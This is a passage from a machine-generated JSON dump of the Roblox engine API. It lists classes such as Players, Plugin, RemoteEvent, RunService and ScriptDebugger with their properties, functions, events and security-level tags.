eturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"bool","Name":"isTeleport","Default":"false"}],"Name":"CreateLocalPlayer","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userID","Default":null}],"Name":"GetPlayerByID","tags":["LocalUserSecurity","deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerById","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPlayerByUserId","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"GetPlayerFromCharacter","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetPlayers","tags":[],"Class":"Players","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUseCoreScriptHealthBar","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"reason","Default":null},{"Type":"string","Name":"optionalMessage","Default":null}],"Name":"ReportAbuse","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAbuseReportUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBuildUserPermissionsUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetChatFilterUrl","tags":["RobloxSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"ChatStyle","Name":"style","Default":"Classic"}],"Name":"SetChatStyle","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetLoadDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSaveLeaderboardDataUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetSysStatsUrl","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"urlId","Default":null}],"Name":"SetSysStatsUrlId","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null}],"Name":"TeamChat","tags":["PluginSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":null},{"Type":"Instance","Name":"player","Default":null}],"Name":"WhisperChat","tags":["LocalUserSecurity"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"getPlayerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getPlayers","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"character","Default":null}],"Name":"playerFromCharacter","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"players","tags":["deprecated"],"Class":"Players","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"blockerUserId","Default":null},{"Type":"int","Name":"blockeeUserId","Default":null}],"Name":"BlockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetCharacterAppearanceAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetFriendsAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetNameFromUserIdAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"userName","Default":null}],"Name":"GetUserIdFromNameAsync","tags":[],"Class":"Players","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"exblockerUserId","Default":null},{"Type":"int","Name":"exblockeeUserId","Default":null}],"Name":"UnblockUser","tags":["RobloxScriptSecurity"],"Class":"Players","type":"YieldFunction"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"player","Type":"Instance"},{"Name":"friendRequestEvent","Type":"FriendRequestEvent"}],"Name":"FriendRequestEvent","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"}],"Name":"GameAnnounce","tags":["RobloxScriptSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAdded","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerAddedEarly","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"chatType","Type":"PlayerChatType"},{"Name":"player","Type":"Instance"},{"Name":"message","Type":"string"},{"Name":"targetPlayer","Type":"Instance"}],"Name":"PlayerChatted","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemoving","tags":[],"Class":"Players","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"PlayerRemovingLate","tags":["LocalUserSecurity"],"Class":"Players","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Plugin","tags":[]},{"ValueType":"bool","type":"Property","Name":"CollisionEnabled","tags":["readonly"],"Class":"Plugin"},{"ValueType":"float","type":"Property","Name":"GridSize","tags":["readonly"],"Class":"Plugin"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"exclusiveMouse","Default":null}],"Name":"Activate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"CreateToolbar","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"JointCreationMode","Arguments":[],"Name":"GetJoinMode","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetStudioUserId","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Negate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"script","Default":null},{"Type":"int","Name":"lineNumber","Default":"0"}],"Name":"OpenScript","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"OpenWikiPage","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveSelectedToRoblox","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Separate","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetSetting","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"Union","tags":["PluginSecurity"],"Class":"Plugin","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"assetType","Default":null}],"Name":"PromptForExistingAssetId","tags":["PluginSecurity"],"Class":"Plugin","type":"YieldFunction"},{"Arguments":[],"Name":"Deactivation","tags":["PluginSecurity"],"Class":"Plugin","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PluginManager","tags":[]},{"ReturnType":"Instance","Arguments":[],"Name":"CreatePlugin","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportPlace","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"filePath","Default":""}],"Name":"ExportSelection","tags":["PluginSecurity"],"Class":"PluginManager","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PointsService","tags":["notCreatable"]},{"ReturnType":"int","Arguments":[],"Name":"GetAwardablePoints","tags":["deprecated"],"Class":"PointsService","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"amount","Default":null}],"Name":"AwardPoints","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGamePointBalance","tags":[],"Class":"PointsService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetPointBalance","tags":["deprecated"],"Class":"PointsService","type":"YieldFunction"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"pointsAwarded","Type":"int"},{"Name":"userBalanceInGame","Type":"int"},{"Name":"userTotalBalance","Type":"int"}],"Name":"PointsAwarded","tags":[],"Class":"PointsService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Pose","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingDirection","type":"Property","Name":"EasingDirection","tags":[],"Class":"Pose"},{"ValueType":"PoseEasingStyle","type":"Property","Name":"EasingStyle","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"MaskWeight","tags":[],"Class":"Pose"},{"ValueType":"float","type":"Property","Name":"Weight","tags":[],"Class":"Pose"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"AddSubPose","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetSubPoses","tags":[],"Class":"Pose","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"pose","Default":null}],"Name":"RemoveSubPose","tags":[],"Class":"Pose","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"PostEffect","tags":[]},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"PostEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BloomEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BloomEffect"},{"ValueType":"float","type":"Property","Name":"Threshold","tags":[],"Class":"BloomEffect"},{"Superclass":"PostEffect","type":"Class","Name":"BlurEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"BlurEffect"},{"Superclass":"PostEffect","type":"Class","Name":"ColorCorrectionEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Brightness","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Contrast","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"float","type":"Property","Name":"Saturation","tags":[],"Class":"ColorCorrectionEffect"},{"ValueType":"Color3","type":"Property","Name":"TintColor","tags":[],"Class":"ColorCorrectionEffect"},{"Superclass":"PostEffect","type":"Class","Name":"SunRaysEffect","tags":[]},{"ValueType":"float","type":"Property","Name":"Intensity","tags":[],"Class":"SunRaysEffect"},{"ValueType":"float","type":"Property","Name":"Spread","tags":[],"Class":"SunRaysEffect"},{"Superclass":"Instance","type":"Class","Name":"RayValue","tags":[]},{"ValueType":"Ray","type":"Property","Name":"Value","tags":[],"Class":"RayValue"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"Changed","tags":[],"Class":"RayValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Ray"}],"Name":"changed","tags":["deprecated"],"Class":"RayValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadata","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataCallbacks","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataClasses","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEnums","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataEvents","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataItem","tags":[]},{"ValueType":"bool","type":"Property","Name":"Browsable","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"Deprecated","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"bool","type":"Property","Name":"IsBackend","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMaximum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"double","type":"Property","Name":"UIMinimum","tags":[],"Class":"ReflectionMetadataItem"},{"ValueType":"string","type":"Property","Name":"summary","tags":[],"Class":"ReflectionMetadataItem"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataClass","tags":[]},{"ValueType":"int","type":"Property","Name":"ExplorerImageIndex","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"int","type":"Property","Name":"ExplorerOrder","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"bool","type":"Property","Name":"Insertable","tags":[],"Class":"ReflectionMetadataClass"},{"ValueType":"string","type":"Property","Name":"PreferredParent","tags":[],"Class":"ReflectionMetadataClass"},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnum","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataEnumItem","tags":[]},{"Superclass":"ReflectionMetadataItem","type":"Class","Name":"ReflectionMetadataMember","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataProperties","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ReflectionMetadataYieldFunctions","tags":[]},{"Superclass":"Instance","type":"Class","Name":"RemoteEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireAllClients","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireClient","tags":[],"Class":"RemoteEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"FireServer","tags":[],"Class":"RemoteEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerEvent","tags":[],"Class":"RemoteEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RemoteFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeClient","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"InvokeServer","tags":[],"Class":"RemoteFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnClientInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"ReturnType":"Tuple","Arguments":[{"Name":"player","Type":"Instance"},{"Name":"arguments","Type":"Tuple"}],"Name":"OnServerInvoke","tags":[],"Class":"RemoteFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"RenderHooksService","tags":[]},{"ReturnType":"void","Arguments":[],"Name":"CaptureMetrics","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"DisableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"EnableAdorns","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"qId","Default":null}],"Name":"EnableQueue","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetDeltaAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetGPUDelay","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetPresentTime","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderAve","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMax","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderConfMin","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRenderStd","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"PrintScene","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReloadShaders","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"width","Default":null},{"Type":"int","Name":"height","Default":null}],"Name":"ResizeWindow","tags":["LocalUserSecurity"],"Class":"RenderHooksService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"RenderSettings","tags":["notbrowsable"]},{"ValueType":"AASamples","type":"Property","Name":"AASamples","tags":[],"Class":"RenderSettings"},{"ValueType":"Antialiasing","type":"Property","Name":"Antialiasing","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"AutoFRMLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"DebugDisableInterpolation","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EagerBulkExecution","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"EditQualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"EnableFRM","tags":["hidden"],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ExportMergeByMaterial","tags":[],"Class":"RenderSettings"},{"ValueType":"FramerateManagerMode","type":"Property","Name":"FrameRateManager","tags":[],"Class":"RenderSettings"},{"ValueType":"GraphicsMode","type":"Property","Name":"GraphicsMode","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsAggregationShown","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"IsSynchronizedWithPhysics","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"MeshCacheSize","tags":[],"Class":"RenderSettings"},{"ValueType":"QualityLevel","type":"Property","Name":"QualityLevel","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ReloadAssets","tags":[],"Class":"RenderSettings"},{"ValueType":"Resolution","type":"Property","Name":"Resolution","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowBoundingBoxes","tags":[],"Class":"RenderSettings"},{"ValueType":"bool","type":"Property","Name":"ShowInterpolationpath","tags":[],"Class":"RenderSettings"},{"ValueType":"int","type":"Property","Name":"TextureCacheSize","tags":[],"Class":"RenderSettings"},{"ReturnType":"int","Arguments":[],"Name":"GetMaxQualityLevel","tags":[],"Class":"RenderSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedFirst","tags":["notCreatable"]},{"ReturnType":"bool","Arguments":[],"Name":"IsDefaultLoadingGuiRemoved","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveDefaultLoadingScreen","tags":[],"Class":"ReplicatedFirst","type":"Function"},{"Arguments":[],"Name":"FinishedReplicating","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Arguments":[],"Name":"RemoveDefaultLoadingGuiSignal","tags":["RobloxScriptSecurity"],"Class":"ReplicatedFirst","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ReplicatedStorage","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"RobloxReplicatedStorage","tags":["notCreatable","notbrowsable"]},{"Superclass":"Instance","type":"Class","Name":"RunService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"int","Name":"priority","Default":null},{"Type":"Function","Name":"function","Default":null}],"Name":"BindToRenderStep","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsClient","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunMode","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsRunning","tags":["RobloxScriptSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsServer","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsStudio","tags":[],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Pause","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Reset","tags":["PluginSecurity","deprecated"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Run","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Stop","tags":["PluginSecurity"],"Class":"RunService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null}],"Name":"UnbindFromRenderStep","tags":[],"Class":"RunService","type":"Function"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"Heartbeat","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"step","Type":"double"}],"Name":"RenderStepped","tags":[],"Class":"RunService","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"},{"Name":"step","Type":"double"}],"Name":"Stepped","tags":[],"Class":"RunService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"RuntimeScriptService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"ScriptContext","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"ScriptsDisabled","tags":["LocalUserSecurity"],"Class":"ScriptContext"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null},{"Type":"Instance","Name":"parent","Default":null},{"Type":"string","Name":"name","Default":null}],"Name":"AddCoreScript","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Instance","Name":"parent","Default":null}],"Name":"AddCoreScriptLocal","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"assetId","Default":null}],"Name":"AddStarterScript","tags":["LocalUserSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"bool","Name":"clearHighwaterMark","Default":"true"}],"Name":"GetHeapStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":"false"}],"Name":"SetCollectScriptStats","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetTimeout","tags":["PluginSecurity"],"Class":"ScriptContext","type":"Function"},{"Arguments":[{"Name":"object","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"CamelCaseViolation","tags":["RobloxScriptSecurity"],"Class":"ScriptContext","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"stackTrace","Type":"string"},{"Name":"script","Type":"Instance"}],"Name":"Error","tags":[],"Class":"ScriptContext","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptDebugger","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"CurrentLine","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsDebugging","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"bool","type":"Property","Name":"IsPaused","tags":["readonly"],"Class":"ScriptDebugger"},{"ValueType":"Object","type":"Property","Name":"Script","tags":["readonly"],"Class":"ScriptDebugger"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"expression","Default":null}],"Name":"AddWatch","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetBreakpoints","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[],"Name":"GetGlobals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetLocals","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Array","Arguments":[],"Name":"GetStack","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Map","Arguments":[{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"GetUpvalues","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"Instance","Name":"watch","Default":null}],"Name":"GetWatchValue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetWatches","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"line","Default":null}],"Name":"SetBreakpoint","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetGlobal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetLocal","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"Variant","Name":"value","Default":null},{"Type":"int","Name":"stackFrame","Default":"0"}],"Name":"SetUpvalue","tags":[],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":["deprecated"],"Class":"ScriptDebugger","type":"Function"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"breakpoint","Type":"Instance"}],"Name":"BreakpointRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"line","Type":"int"}],"Name":"EncounteredBreak","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[],"Name":"Resuming","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchAdded","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Arguments":[{"Name":"watch","Type":"Instance"}],"Name":"WatchRemoved","tags":[],"Class":"ScriptDebugger","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ScriptInformationProvider","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"access","Default":null}],"Name":"SetAccessKey","tags":["RobloxSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAssetUrl","tags":["LocalUserSecurity"],"Class":"ScriptInformationProvider","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"ScriptService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Selection","tags":[]},{"ReturnType":"Objects","Arguments":[],"Name":"Get","tags":["PluginSecurity"],"Class":"